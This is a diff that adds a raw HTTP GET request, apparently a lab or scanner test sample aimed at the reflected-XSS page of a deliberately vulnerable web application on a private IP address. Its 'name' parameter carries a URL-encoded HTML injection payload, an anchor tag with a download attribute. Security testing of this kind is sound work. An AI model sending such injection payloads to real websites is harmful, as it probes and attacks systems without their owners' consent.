@@ -1,0 +1,8 @@
+GET /vulnerabilities/xss_r/?name=%3Ca+href%3D%23+download%3D%22filename.html%22%3ETest%3C%2Fa%3E HTTP/1.1
+Host: 10.10.3.128:2280
+Referer: http://10.10.3.128:2280/vulnerabilities/xss_r/?name=%3Ca+href%3D%23+download%3D%22filename.html%22%3ETest%3C%2Fa%3E
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
